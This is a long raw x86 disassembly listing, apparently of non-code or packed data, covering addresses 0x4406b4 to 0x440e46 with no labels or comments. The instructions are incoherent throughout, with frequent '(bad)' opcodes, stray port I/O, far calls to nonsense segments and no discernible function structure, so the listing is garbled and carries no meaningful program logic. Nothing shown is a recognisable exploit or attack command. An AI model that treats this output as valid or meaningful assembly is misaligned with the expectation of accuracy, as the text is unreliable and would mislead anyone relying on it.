  4406b4:	add    DWORD PTR [eax-0x69],ecx
  4406b7:	sub    ah,ah
  4406b9:	gs push ds
  4406bb:	cmp    esp,esp
  4406bd:	hlt    
  4406be:	mov    DWORD PTR [ebp-0x22],esi
  4406c1:	fstp   DWORD PTR [edx-0x783f0655]
  4406c7:	dec    edx
  4406c8:	hlt    
  4406c9:	lds    ecx,FWORD PTR [edi-0x1a]
  4406cc:	pushf  
  4406cd:	jo     0x4406ee
  4406cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4406d0:	mov    al,ds:0x8acf1db4
  4406d5:	and    ecx,DWORD PTR [edx+0x541c43d5]
  4406db:	in     eax,dx
  4406dc:	xchg   ebx,eax
  4406dd:	jmp    0x44075a
  4406df:	and    BYTE PTR [ecx-0x6a6ee020],ch
  4406e5:	retf   
  4406e6:	ror    BYTE PTR [ecx],0x10
  4406e9:	pop    es
  4406ea:	aas    
  4406eb:	xlat   BYTE PTR ds:[ebx]
  4406ec:	and    eax,0x3a2c3bd1
  4406f1:	ret    
  4406f2:	sbb    edx,esp
  4406f4:	mov    dh,0x35
  4406f6:	dec    ebx
  4406f7:	xchg   ecx,eax
  4406f8:	mov    ebp,ebx
  4406fa:	retf   0x1608
  4406fd:	inc    ebp
  4406fe:	(bad)  
  4406ff:	sahf   
  440700:	(bad)  
  440701:	cdq    
  440702:	xor    DWORD PTR [eax+ebp*8+0x77],edx
  440706:	xchg   ebx,eax
  440707:	mov    dl,0xcf
  440709:	pop    eax
  44070a:	pop    ds
  44070b:	out    dx,eax
  44070c:	sub    ah,bh
  44070e:	xlat   BYTE PTR ds:[ebx]
  44070f:	bswap  edx
  440711:	mov    ds:0xf3ded4e2,al
  440716:	mov    al,0xae
  440718:	fimul  DWORD PTR [edi-0x6a6b4810]
  44071e:	cli    
  44071f:	and    eax,ecx
  440721:	add    BYTE PTR [ebp+0x2b],cl
  440724:	and    BYTE PTR [ebp+0x6],bl
  440727:	ror    DWORD PTR [ebp+0x3],0xdc
  44072b:	popa   
  44072c:	shr    DWORD PTR ds:0x36481935,cl
  440732:	gs icebp 
  440734:	inc    ebp
  440735:	add    bh,BYTE PTR ds:0x396fcb3a
  44073b:	xchg   esp,eax
  44073c:	scas   eax,DWORD PTR es:[edi]
  44073d:	hlt    
  44073e:	mov    ebx,0xee05a6df
  440743:	jae    0x440713
  440745:	push   es
  440746:	nop
  440747:	add    dl,BYTE PTR [ebp-0xc9ce1e2]
  44074d:	into   
  44074e:	out    dx,eax
  44074f:	es mov ebp,0x6ff17f87
  440755:	in     al,dx
  440756:	ror    BYTE PTR [eax+esi*1+0x3],0xe6
  44075b:	push   es
  44075c:	adc    DWORD PTR ds:[edx+0x51],0x68
  440761:	out    dx,eax
  440762:	jge    0x4407c3
  440764:	jns    0x4407c8
  440766:	mov    dh,0x15
  440768:	pop    edx
  440769:	call   0x461a:0x33538c1
  440770:	add    DWORD PTR [ebp-0x75512c22],ebx
  440776:	pop    esi
  440777:	adc    eax,0xed1fad1c
  44077c:	pop    ebx
  44077d:	inc    ebp
  44077e:	pushf  
  44077f:	int3   
  440780:	lds    eax,FWORD PTR ds:0x16bb93fa
  440786:	ds ror ch,cl
  440789:	aam    0x1f
  44078b:	fist   WORD PTR [ecx+0x1a]
  44078e:	jp     0x4407f1
  440790:	inc    eax
  440791:	(bad)
  440794:	push   ss
  440795:	mov    edi,0x1b24d425
  44079a:	xchg   DWORD PTR [eax-0x726f3fe7],ebp
  4407a0:	push   cs
  4407a1:	add    esp,esi
  4407a3:	sub    edi,ebp
  4407a5:	rol    DWORD PTR [eax-0x5c],0x21
  4407a9:	adc    al,0xe8
  4407ab:	lock sub ebp,ebx
  4407ae:	jecxz  0x4407a4
  4407b0:	cwde   
  4407b1:	ret    
  4407b2:	adc    dl,cl
  4407b4:	(bad)  
  4407b5:	xor    ebx,DWORD PTR [edx-0x9fa1224]
  4407bb:	adc    al,0xee
  4407bd:	mov    ecx,DWORD PTR [esi]
  4407bf:	repnz mov DWORD PTR [ebx+0x5b],ebp
  4407c3:	mov    eax,DWORD PTR [ecx-0x5a65bd22]
  4407c9:	add    al,BYTE PTR [esi+0x6f]
  4407cc:	mov    ds:0x40cdefca,al
  4407d1:	push   ds
  4407d2:	push   ds
  4407d3:	jne    0x440774
  4407d5:	dec    edi
  4407d6:	push   es
  4407d7:	add    BYTE PTR [edi],cl
  4407d9:	outs   dx,DWORD PTR ds:[esi]
  4407da:	pop    ss
  4407db:	adc    al,0x58
  4407dd:	dec    ebx
  4407de:	(bad)  
  4407df:	mov    dl,0xb9
  4407e1:	mov    ah,0x60
  4407e3:	mov    ebp,esi
  4407e5:	pop    esp
  4407e6:	xor    al,BYTE PTR [ebx-0x2ba836d2]
  4407ec:	aaa    
  4407ed:	(bad)  
  4407ee:	xchg   edi,eax
  4407ef:	push   ecx
  4407f0:	xor    al,bl
  4407f2:	retf   
  4407f3:	sub    BYTE PTR [ebx+eiz*4+0x48],ah
  4407f7:	dec    ebx
  4407f8:	pop    esi
  4407f9:	sar    BYTE PTR [esi],0xd7
  4407fc:	arpl   WORD PTR [esi+0x521c759c],bp
  440802:	jle    0x4407d9
  440804:	sbb    dl,dl
  440806:	in     eax,0xd8
  440808:	scas   al,BYTE PTR es:[edi]
  440809:	or     ecx,DWORD PTR [eax*4+0x717b36a8]
  440810:	stc    
  440811:	cwde   
  440812:	mov    ebx,0xbe831094
  440817:	push   ds
  440818:	sub    al,BYTE PTR [ebx]
  44081a:	cmp    ah,BYTE PTR ds:0x31657f98
  440820:	pop    ebp
  440821:	mov    bl,0x7b
  440823:	dec    ebx
  440824:	mov    eax,ds:0x85d5df59
  440829:	mov    ?,ebx
  44082b:	sahf   
  44082c:	cmp    al,0x2
  44082e:	cmp    BYTE PTR [eax-0x26],cl
  440831:	mov    bl,0x3d
  440833:	fcmovne st,st(2)
  440835:	nop
  440836:	xchg   ecx,eax
  440837:	sub    eax,ebp
  440839:	mov    gs,WORD PTR [ebp-0x2b]
  44083c:	adc    eax,0x3e8da8af
  440841:	ja     0x44087a
  440843:	mov    edx,0x99c4d84
  440848:	enter  0xe75f,0xc9
  44084c:	fwait
  44084d:	popw   ds
  44084f:	xor    edi,edi
  440851:	mov    esp,0x902e6ab
  440856:	mov    eax,0xfe6aa8d4
  44085b:	or     ebx,DWORD PTR [ecx-0x5af42827]
  440861:	retf   
  440862:	xchg   ecx,eax
  440863:	test   al,0x96
  440865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440866:	cmp    dl,BYTE PTR [edx+eiz*8+0x64]
  44086a:	pop    ebx
  44086b:	push   ebp
  44086c:	out    dx,eax
  44086d:	add    ch,BYTE PTR [edx-0x48a7a939]
  440873:	and    al,0x43
  440875:	pop    ds
  440876:	push   ds
  440877:	jne    0x4408bf
  440879:	jne    0x4408de
  44087b:	xchg   edx,eax
  44087c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44087d:	es dec ecx
  44087f:	scas   eax,DWORD PTR es:[edi]
  440880:	int    0x36
  440882:	fimul  DWORD PTR [ebp+0x8]
  440885:	sbb    al,0x87
  440887:	pop    esi
  440888:	cwde   
  440889:	retf   0x2e1
  44088c:	jns    0x440856
  44088e:	mov    al,0x1
  440890:	lea    ebp,[eax+eiz*2+0x52919519]
  440897:	inc    edx
  440898:	shl    BYTE PTR [esi-0x32df2ff5],cl
  44089e:	ret    0x75fc
  4408a1:	sub    eax,0x44806fde
  4408a6:	pop    ds
  4408a7:	push   edi
  4408a8:	aaa    
  4408a9:	hlt    
  4408aa:	mov    ch,0x82
  4408ac:	ins    BYTE PTR es:[edi],dx
  4408ad:	out    dx,al
  4408ae:	adc    bh,dl
  4408b0:	xor    eax,0x1099a65d
  4408b5:	stos   DWORD PTR es:[edi],eax
  4408b6:	repz js 0x7de7fd0
  4408bd:	lea    esp,[ebx]
  4408bf:	ss cli 
  4408c1:	add    eax,0x51a779fe
  4408c6:	mov    bl,0x3b
  4408c8:	xchg   edx,eax
  4408c9:	push   cs
  4408ca:	pusha  
  4408cb:	xchg   edi,eax
  4408cc:	ss cs mov ch,0xe7
  4408d0:	pop    esp
  4408d1:	shl    DWORD PTR [ebp-0x3ce9b12c],0xa
  4408d8:	and    ecx,DWORD PTR [ebp+0x20]
  4408db:	add    eax,0x671f186d
  4408e0:	xor    al,0x6a
  4408e2:	cdq    
  4408e3:	sbb    eax,0xd81aecdd
  4408e8:	enter  0x3c02,0x72
  4408ec:	pushf  
  4408ed:	cwde   
  4408ee:	lahf   
  4408ef:	and    ebp,ebp
  4408f1:	dec    ebx
  4408f2:	jl     0x44087d
  4408f4:	pop    ebp
  4408f5:	fs inc ebp
  4408f7:	push   ebp
  4408f8:	and    eax,0x8212e0a7
  4408fd:	add    ch,BYTE PTR [edx+eax*1-0x46]
  440901:	sub    eax,DWORD PTR [edi+esi*8]
  440904:	inc    ebx
  440905:	jmp    0xf1934e6a
  44090a:	repz enter 0x576b,0xf6
  44090f:	pop    esi
  440910:	and    al,0xcb
  440912:	pop    ds
  440913:	sbb    DWORD PTR [edx-0x20ab6560],ecx
  440919:	sbb    ecx,DWORD PTR [esi]
  44091b:	ins    DWORD PTR es:[edi],dx
  44091c:	or     DWORD PTR [ebx+0x4f],edx
  44091f:	fadd   DWORD PTR [eax]
  440921:	mov    esp,0x211ecca
  440926:	jmp    0x237e:0xa976d21
  44092d:	test   BYTE PTR [edi],bl
  44092f:	ins    DWORD PTR es:[edi],dx
  440930:	aad    0xd5
  440932:	aas    
  440933:	inc    edi
  440934:	xlat   BYTE PTR es:[ebx]
  440936:	jecxz  0x44090c
  440938:	fst    QWORD PTR [ebx-0x75]
  44093b:	int3   
  44093c:	and    dh,BYTE PTR [edi]
  44093e:	add    dl,BYTE PTR [eax+edx*2+0x13]
  440942:	xchg   ebx,eax
  440943:	ret    
  440944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440945:	mul    BYTE PTR [eax+0x39]
  440948:	push   ds
  440949:	movaps XMMWORD PTR ds:0xd65c12c0,xmm0
  440950:	push   es
  440951:	int    0xc1
  440953:	into   
  440954:	cmp    al,0x2c
  440956:	inc    eax
  440957:	cmp    al,0x70
  440959:	data16 adc al,0x4c
  44095c:	mov    ecx,ecx
  44095e:	inc    eax
  44095f:	mov    ecx,0xe1191c46
  440964:	iret   
  440965:	add    esi,ebp
  440967:	mov    ds:0xe2ff4ac1,al
  44096c:	xchg   DWORD PTR [eax-0xf],ebx
  44096f:	cmc    
  440970:	push   0x8863f88a
  440975:	sub    eax,0xafd3add4
  44097a:	jb     0x440998
  44097c:	xchg   ebx,eax
  44097d:	add    dl,ch
  44097f:	sub    BYTE PTR [ecx-0x43],dl
  440982:	scas   eax,DWORD PTR es:[edi]
  440983:	dec    esi
  440984:	inc    ebx
  440985:	xchg   ebx,eax
  440986:	fsubrp st(1),st
  440988:	mov    BYTE PTR ds:0x9be6c125,bl
  44098e:	sbb    al,0xfb
  440990:	lds    edx,FWORD PTR [edi]
  440992:	lods   al,BYTE PTR ds:[esi]
  440993:	hlt    
  440994:	dec    ebx
  440995:	jne    0x44091a
  440997:	xor    eax,0xb175a995
  44099c:	xchg   BYTE PTR [ebx+0x58e1564f],bh
  4409a2:	lahf   
  4409a3:	icebp  
  4409a4:	in     al,dx
  4409a5:	in     al,0xbe
  4409a7:	aad    0xf6
  4409a9:	xor    bl,dh
  4409ab:	fnstsw WORD PTR [edi-0x4f704ee0]
  4409b1:	push   edi
  4409b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4409b3:	stos   DWORD PTR es:[edi],eax
  4409b4:	or     BYTE PTR [edx],bh
  4409b6:	jo     0x4409af
  4409b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4409b9:	sub    DWORD PTR [esi-0x55],esi
  4409bc:	je     0x440a12
  4409be:	push   ebp
  4409bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4409c0:	ret    
  4409c1:	inc    ebp
  4409c2:	push   ecx
  4409c3:	xor    al,0x45
  4409c5:	cmp    ebx,DWORD PTR [edi]
  4409c7:	cmp    edx,DWORD PTR [edx-0x2f375f83]
  4409cd:	cmp    DWORD PTR [ecx],edx
  4409cf:	aam    0xcf
  4409d1:	(bad)  
  4409d2:	rcr    DWORD PTR [eax],1
  4409d4:	dec    eax
  4409d5:	fmul   st(5),st
  4409d7:	jmp    0xd77e4bec
  4409dc:	pop    ds
  4409dd:	imul   ebx,DWORD PTR [ecx],0x6a47cbeb
  4409e3:	mov    ah,0x7e
  4409e5:	add    al,BYTE PTR [edx+0x5e]
  4409e8:	leave  
  4409e9:	ret    0x2ab3
  4409ec:	sub    DWORD PTR [edx+0x27b88f93],eax
  4409f2:	xor    al,0x75
  4409f4:	jnp    0x440a39
  4409f6:	cmp    eax,0x3c40ccc2
  4409fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4409fc:	mov    ebx,0x7eca7d59
  440a01:	ret    
  440a02:	xor    BYTE PTR [esi+0x391f5898],cl
  440a08:	cmc    
  440a09:	or     eax,0x75ee67ab
  440a0e:	in     al,dx
  440a0f:	aad    0x54
  440a11:	mov    edx,DWORD PTR [esi+0xf960f63]
  440a17:	mov    al,0x8b
  440a19:	aaa    
  440a1a:	sub    DWORD PTR [edx-0x4d],0xfffffff5
  440a1e:	sub    al,0x9c
  440a20:	or     BYTE PTR [ebx+0x7136abc5],dl
  440a26:	in     al,0xbc
  440a28:	in     al,dx
  440a29:	lds    eax,FWORD PTR [ebp-0x5]
  440a2c:	(bad)
  440a30:	mov    eax,0xef769005
  440a35:	aad    0xf
  440a37:	ror    BYTE PTR [esi],0x3
  440a3a:	stos   BYTE PTR es:[edi],al
  440a3b:	std    
  440a3c:	sbb    ch,dl
  440a3e:	dec    DWORD PTR [edx]
  440a40:	xchg   ebp,eax
  440a41:	in     eax,0x60
  440a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440a44:	mov    bh,0x58
  440a46:	adc    BYTE PTR [esi-0x14],bl
  440a49:	cld    
  440a4a:	inc    edi
  440a4b:	aad    0x8e
  440a4d:	push   edx
  440a4e:	lock icebp 
  440a50:	add    BYTE PTR [esi+edx*1],dh
  440a53:	or     eax,0x91639e64
  440a58:	and    al,0xd9
  440a5a:	pop    edx
  440a5b:	popa   
  440a5c:	inc    esp
  440a5d:	add    DWORD PTR [edx-0x4a07db0d],0xffffffd4
  440a64:	dec    ecx
  440a65:	xor    ah,BYTE PTR [ebx-0x58]
  440a68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440a69:	out    0x71,eax
  440a6b:	and    BYTE PTR [edi+0x6b55988d],al
  440a71:	(bad)  
  440a73:	pop    eax
  440a74:	call   0x3318f747
  440a79:	out    dx,al
  440a7a:	mov    fs,WORD PTR [edx]
  440a7c:	mov    cl,0x91
  440a7e:	dec    ecx
  440a7f:	fist   WORD PTR [edi+0x25a46947]
  440a85:	ret    
  440a86:	ja     0x440a81
  440a88:	sti    
  440a89:	mov    ebp,0xa97c6f37
  440a8e:	pop    eax
  440a8f:	aam    0x1
  440a91:	mov    cl,0xf7
  440a93:	pop    ebp
  440a94:	test   al,0x22
  440a96:	push   ds
  440a97:	or     ecx,DWORD PTR [edx-0x14b502ad]
  440a9d:	sub    DWORD PTR ds:[eax+0x49],ebx
  440aa1:	sbb    DWORD PTR [edi],0x8acd824f
  440aa7:	sub    al,0x8e
  440aa9:	scas   al,BYTE PTR es:[edi]
  440aaa:	sahf   
  440aab:	int    0x29
  440aad:	add    ebx,DWORD PTR [ecx-0x72]
  440ab0:	ins    DWORD PTR es:[edi],dx
  440ab1:	cmp    bl,bh
  440ab3:	and    BYTE PTR [edi+0x3],dh
  440ab6:	jbe    0x440b33
  440ab8:	jns    0x440ace
  440aba:	add    al,0xa2
  440abc:	cmc    
  440abd:	mov    ch,0x60
  440abf:	out    dx,eax
  440ac0:	or     al,0xf
  440ac2:	mov    ah,0xca
  440ac4:	enter  0x1be,0xa2
  440ac8:	std    
  440ac9:	cli    
  440aca:	retf   
  440acb:	xchg   ecx,eax
  440acc:	mov    dh,dl
  440ace:	fadd   DWORD PTR [ecx]
  440ad0:	mov    ebp,0xbeed1f18
  440ad5:	jb     0x440b49
  440ad7:	dec    esp
  440ad8:	adc    al,0x6f
  440ada:	mov    edi,0x2302f2d4
  440adf:	sar    dl,0xb8
  440ae2:	or     eax,0x8bf98833
  440ae7:	idiv   BYTE PTR [esi+0x1314e2ae]
  440aed:	add    al,BYTE PTR [edx+0x365163dc]
  440af3:	jp     0x440b6e
  440af5:	pop    ecx
  440af6:	push   ds
  440af7:	inc    ecx
  440af8:	and    DWORD PTR [eax],ebx
  440afa:	aad    0x64
  440afc:	call   0x7995:0xdf9d52b7
  440b03:	push   ebp
  440b04:	(bad)  
  440b06:	fidiv  DWORD PTR [ebp-0x56e0f4a4]
  440b0c:	cmp    al,BYTE PTR [eax-0x5b]
  440b0f:	mov    bh,0xae
  440b11:	shr    bl,1
  440b13:	shl    DWORD PTR [edi+ecx*4+0xd],cl
  440b17:	mov    ebp,0x74b6b368
  440b1c:	or     eax,0x66d4e38d
  440b21:	add    ebp,DWORD PTR [eax]
  440b23:	push   0xb343ff52
  440b28:	sbb    bl,0x50
  440b2b:	(bad)  
  440b2c:	out    0x64,eax
  440b2e:	xchg   ebp,eax
  440b2f:	scas   al,BYTE PTR es:[edi]
  440b30:	outs   dx,DWORD PTR ds:[esi]
  440b31:	call   0x68e0:0xc6c9d128
  440b38:	mov    DWORD PTR [edi],esi
  440b3a:	and    eax,0x5cc5b550
  440b3f:	adc    al,0x44
  440b41:	sbb    esp,DWORD PTR [eax-0x77]
  440b44:	(bad)  
  440b45:	pusha  
  440b46:	aam    0xd4
  440b48:	inc    ebp
  440b49:	shr    BYTE PTR [ecx-0x51247656],cl
  440b4f:	push   ebx
  440b50:	jae    0x440b98
  440b52:	lds    eax,FWORD PTR [eax]
  440b54:	xor    al,0x3
  440b56:	test   BYTE PTR [edx+ebx*2+0x71],ah
  440b5a:	push   esp
  440b5b:	sub    ebx,DWORD PTR [ebp+eax*2+0x59fee83e]
  440b62:	nop
  440b63:	call   0xb16d:0x391f8d55
  440b6a:	adc    edx,0xcea81091
  440b70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440b71:	fistp  WORD PTR [edi]
  440b73:	stc    
  440b74:	add    esp,ebx
  440b76:	adc    eax,0x19d18989
  440b7b:	mov    al,0x9d
  440b7d:	push   0x870ec122
  440b82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440b83:	xchg   esp,eax
  440b84:	mov    BYTE PTR ds:0xa349a767,ch
  440b8a:	push   es
  440b8b:	pusha  
  440b8c:	mov    esi,DWORD PTR [edi]
  440b8e:	push   0xc629ee1b
  440b93:	mov    dh,0x78
  440b95:	inc    ebx
  440b96:	push   esi
  440b97:	aam    0xe0
  440b99:	or     DWORD PTR [ebx+0x6e],ebx
  440b9c:	cdq    
  440b9d:	jge    0x440b9c
  440b9f:	fimul  WORD PTR [ecx-0x44946063]
  440ba5:	(bad)  
  440ba6:	cmp    BYTE PTR [ecx],ah
  440ba8:	dec    ecx
  440ba9:	add    ebp,DWORD PTR [esp+ebx*1+0x3d56f34e]
  440bb0:	ficomp WORD PTR [ecx+0x1e]
  440bb3:	leave  
  440bb4:	ficom  WORD PTR [edx-0x42]
  440bb7:	mov    dh,0x16
  440bb9:	std    
  440bba:	mov    ah,0xd5
  440bbc:	jnp    0x440b4b
  440bbe:	test   DWORD PTR [eax+0x7c4bd5c],ecx
  440bc4:	mov    bl,0x45
  440bc6:	cmp    eax,0x217a886c
  440bcb:	jle    0x440beb
  440bcd:	jno    0x440c16
  440bcf:	aam    0x8
  440bd1:	sbb    BYTE PTR [eax-0x7e],al
  440bd4:	add    BYTE PTR [ebx-0x16053dfd],ch
  440bda:	(bad)  
  440bdc:	loopne 0x440bc0
  440bde:	mov    ah,0x87
  440be0:	mov    ah,0x9d
  440be2:	jns    0x440bb9
  440be4:	add    edx,DWORD PTR [ebp-0x48f2b272]
  440bea:	arpl   bp,bp
  440bec:	mov    DWORD PTR [ecx],eax
  440bee:	inc    ecx
  440bef:	mov    eax,ds:0xe1742442
  440bf4:	mov    esi,0xde341849
  440bf9:	test   DWORD PTR [ecx],ecx
  440bfb:	sbb    al,0xba
  440bfd:	ret    
  440bfe:	lahf   
  440bff:	dec    edx
  440c00:	xchg   edi,eax
  440c01:	push   ebp
  440c02:	xor    al,0xfe
  440c04:	push   edx
  440c05:	ret    
  440c06:	add    dh,al
  440c08:	jb     0x440c29
  440c0a:	sbb    al,0xc0
  440c0c:	not    DWORD PTR [ebp+0x78956f9]
  440c12:	ins    BYTE PTR es:[edi],dx
  440c13:	js     0x440c59
  440c15:	sub    edx,esp
  440c17:	(bad)  
  440c18:	xchg   ebp,eax
  440c19:	pop    ecx
  440c1a:	sub    BYTE PTR [edi+0xbc2953c],ah
  440c20:	dec    eax
  440c21:	inc    edi
  440c22:	das    
  440c23:	cmc    
  440c24:	test   BYTE PTR [eax],bh
  440c26:	iret   
  440c27:	stos   BYTE PTR es:[edi],al
  440c28:	mov    DWORD PTR [edi-0x673cd7c1],ebx
  440c2e:	aas    
  440c2f:	xchg   ecx,eax
  440c30:	mov    al,BYTE PTR [edx]
  440c32:	mov    cl,dh
  440c34:	ja     0x440bfa
  440c36:	sub    eax,0x1e70baf1
  440c3b:	mov    esp,DWORD PTR [esi+0x79]
  440c3e:	fs and esp,edx
  440c41:	in     al,dx
  440c42:	sub    esp,edx
  440c44:	dec    esp
  440c45:	dec    eax
  440c46:	loop   0x440bfc
  440c48:	xchg   edi,eax
  440c49:	daa    
  440c4a:	dec    ecx
  440c4b:	stos   DWORD PTR es:[edi],eax
  440c4c:	mov    DWORD PTR [ecx],ebx
  440c4e:	sahf   
  440c4f:	mov    esi,0x2dc6f30a
  440c54:	loopne 0x440c5b
  440c56:	nop
  440c57:	pop    eax
  440c58:	(bad)
  440c5b:	(bad)  
  440c5c:	test   al,0xb
  440c5e:	data16 xlat BYTE PTR ds:[ebx]
  440c60:	loopne 0x440c2c
  440c62:	sbb    edi,DWORD PTR [ebx+0x3a5085e2]
  440c68:	pop    ebx
  440c69:	jo     0x440bf9
  440c6b:	lods   al,BYTE PTR ds:[esi]
  440c6c:	imul   esp,DWORD PTR ds:0x940e44d4,0x189cd4de
  440c76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440c77:	aaa    
  440c78:	call   0xe212ba8
  440c7d:	cmp    BYTE PTR [ebp-0x78faedd2],ch
  440c83:	mov    ebx,0x2195bfa5
  440c88:	dec    eax
  440c89:	outs   dx,DWORD PTR ds:[esi]
  440c8a:	fcmovne st,st(4)
  440c8c:	call   0x495f7312
  440c91:	out    0xef,eax
  440c93:	dec    ecx
  440c94:	clc    
  440c95:	and    dl,BYTE PTR [edi+0x7a14d82e]
  440c9b:	or     bh,BYTE PTR [ecx+0x61]
  440c9e:	js     0x440cd7
  440ca0:	xchg   esp,eax
  440ca1:	xlat   BYTE PTR ds:[ebx]
  440ca2:	inc    ebx
  440ca3:	hlt    
  440ca4:	mov    ecx,0xefef1f53
  440ca9:	aas    
  440caa:	scas   al,BYTE PTR es:[edi]
  440cab:	ret    0xf3b2
  440cae:	jo     0x440c82
  440cb0:	test   eax,0xb79c4925
  440cb5:	sbb    eax,0x14f45c6f
  440cba:	jnp    0x440ca5
  440cbc:	(bad)  
  440cbd:	fistp  DWORD PTR ds:0x8f1ef05e
  440cc3:	test   al,0xa1
  440cc5:	sbb    ebx,edx
  440cc7:	xlat   BYTE PTR ds:[ebx]
  440cc8:	push   edi
  440cc9:	rcl    DWORD PTR ds:0xfe5320a0,cl
  440ccf:	aam    0x38
  440cd1:	cmc    
  440cd2:	inc    esp
  440cd3:	(bad)  
  440cd4:	mov    dl,0x7d
  440cd6:	cmp    ebp,DWORD PTR [edx-0x78]
  440cd9:	cmp    DWORD PTR [edi-0xe76df6b],eax
  440cdf:	pop    esp
  440ce0:	fld    DWORD PTR ds:0x64dc0f44
  440ce6:	sbb    al,0x92
  440ce8:	push   ss
  440ce9:	imul   ebx,DWORD PTR [esi],0x4e72d3e1
  440cef:	xor    DWORD PTR [edi+0x11],esi
  440cf2:	or     eax,0x201f19c1
  440cf7:	ret    
  440cf8:	xchg   BYTE PTR [ecx+0x24],bh
  440cfb:	inc    ecx
  440cfc:	or     DWORD PTR [ecx+0x63],ecx
  440cff:	retf   0x4189
  440d02:	ds pop esp
  440d04:	rcl    DWORD PTR [ebp-0x39],0x96
  440d08:	dec    eax
  440d09:	add    edi,DWORD PTR [esi]
  440d0b:	icebp  
  440d0c:	test   al,0xc9
  440d0e:	sbb    bl,BYTE PTR [eax+0xe]
  440d11:	ins    DWORD PTR es:[edi],dx
  440d12:	push   esi
  440d13:	mov    edi,DWORD PTR [ebx-0x420e1f5e]
  440d19:	fadd   QWORD PTR [ebx]
  440d1b:	out    0xe2,eax
  440d1d:	shr    DWORD PTR [eax],1
  440d1f:	sar    esi,1
  440d21:	mov    ds:0xec00c6c3,eax
  440d26:	adc    al,0x24
  440d28:	add    BYTE PTR [ebx],ah
  440d2a:	ins    BYTE PTR es:[edi],dx
  440d2b:	iret   
  440d2c:	sbb    bl,BYTE PTR [ebx]
  440d2e:	mov    al,0x6f
  440d30:	test   eax,0xfd935829
  440d35:	add    eax,0x1437c948
  440d3a:	stc    
  440d3b:	and    edi,eax
  440d3d:	pushw  ds
  440d3f:	ja     0x440d8d
  440d41:	mov    esi,0xb36f429b
  440d46:	pop    esp
  440d47:	inc    esi
  440d48:	pop    es
  440d49:	fs pop ds
  440d4b:	dec    ecx
  440d4c:	in     al,dx
  440d4d:	pop    ds
  440d4e:	mov    al,0x75
  440d50:	xor    ch,BYTE PTR [ecx]
  440d52:	pop    ds
  440d53:	imul   ebp,DWORD PTR [edx-0x1a],0xffffffc9
  440d57:	and    al,0x3a
  440d59:	dec    edx
  440d5a:	jno    0x440d31
  440d5c:	push   ebx
  440d5d:	jecxz  0x440dca
  440d5f:	push   ebx
  440d60:	adc    al,0xd3
  440d62:	dec    esi
  440d63:	jp     0x440ced
  440d65:	jmp    0x22c355ec
  440d6a:	pop    esi
  440d6b:	fist   WORD PTR [ebp+0x2]
  440d6e:	sar    BYTE PTR [edx],0x2c
  440d71:	out    dx,al
  440d72:	inc    esi
  440d73:	ror    BYTE PTR [edx],cl
  440d75:	das    
  440d76:	pop    ds
  440d77:	arpl   WORD PTR [edi-0x5d9cfdc6],si
  440d7d:	pop    es
  440d7e:	mov    ah,0xd4
  440d80:	nop
  440d81:	mov    eax,ds:0xc7487dc
  440d86:	ret    
  440d87:	in     eax,dx
  440d88:	xchg   DWORD PTR [ecx],eax
  440d8a:	xchg   esi,eax
  440d8b:	push   es
  440d8c:	lahf   
  440d8d:	mov    cl,0xe0
  440d8f:	rcr    BYTE PTR [eax+0x5cb25b86],cl
  440d95:	sub    ecx,ecx
  440d97:	aam    0x19
  440d99:	loope  0x440da7
  440d9b:	jo     0x440dc6
  440d9d:	inc    eax
  440d9e:	sbb    al,0xe6
  440da0:	mov    BYTE PTR [ebx-0x4486fa15],dh
  440da6:	lahf   
  440da7:	fdiv   QWORD PTR [esi-0x650dffb]
  440dad:	mov    esp,0x37144a1f
  440db2:	pop    ss
  440db3:	xor    eax,0x4f703fb9
  440db8:	mov    eax,0xd8d5e1da
  440dbd:	arpl   WORD PTR [edx+0x49],bp
  440dc0:	xor    cl,BYTE PTR [edi+0x49f0d830]
  440dc6:	aad    0xd4
  440dc8:	in     eax,dx
  440dc9:	rcr    DWORD PTR fs:[esi],0x24
  440dcd:	arpl   sp,ax
  440dcf:	aad    0x15
  440dd1:	adc    eax,0xf0f7815e
  440dd6:	sub    al,0x8e
  440dd8:	xchg   DWORD PTR [ebp-0x1aa02727],edi
  440dde:	jg     0x440df5
  440de0:	fisubr WORD PTR [esi+eax*2-0x1872ad2b]
  440de7:	mov    eax,0x3ee91a60
  440dec:	mov    DWORD PTR [ecx-0x7c],ecx
  440def:	rcl    esp,cl
  440df1:	add    eax,0x14f8e527
  440df6:	scas   al,BYTE PTR es:[edi]
  440df7:	(bad)  
  440df8:	xor    al,0x16
  440dfa:	cli    
  440dfb:	aad    0xfc
  440dfd:	scas   eax,DWORD PTR es:[edi]
  440dfe:	push   ds
  440dff:	cmc    
  440e00:	mov    DWORD PTR [ecx+0x2de246a4],ebp
  440e06:	jns    0x440d9b
  440e08:	inc    edi
  440e09:	add    bl,al
  440e0b:	lods   eax,DWORD PTR ds:[esi]
  440e0c:	outs   dx,BYTE PTR ds:[esi]
  440e0d:	dec    edi
  440e0e:	rol    DWORD PTR [edx-0x6a],cl
  440e11:	mov    ch,0xdf
  440e13:	adc    dh,BYTE PTR [edx-0x6c]
  440e16:	pusha  
  440e17:	jns    0x440e1d
  440e19:	and    bh,BYTE PTR [edi]
  440e1b:	lea    edi,[edx+ecx*8+0xc]
  440e1f:	mov    edx,DWORD PTR [eax-0x30]
  440e22:	iret   
  440e23:	aam    0x4c
  440e25:	dec    ebx
  440e26:	retf   0x63bd
  440e29:	lock pusha 
  440e2b:	gs mov bh,0xab
  440e2e:	sbb    al,cl
  440e30:	ds push bp
  440e33:	aam    0x63
  440e35:	stos   DWORD PTR es:[edi],eax
  440e36:	stos   DWORD PTR es:[edi],eax
  440e37:	repnz pop es
  440e39:	mov    eax,0x8f8dc02e
  440e3e:	test   ch,ah
  440e40:	add    BYTE PTR [ebp-0x35],dh
  440e43:	push   ebp
  440e44:	ret    
  440e45:	push   ss
  440e46:	rcr    dh,0x75
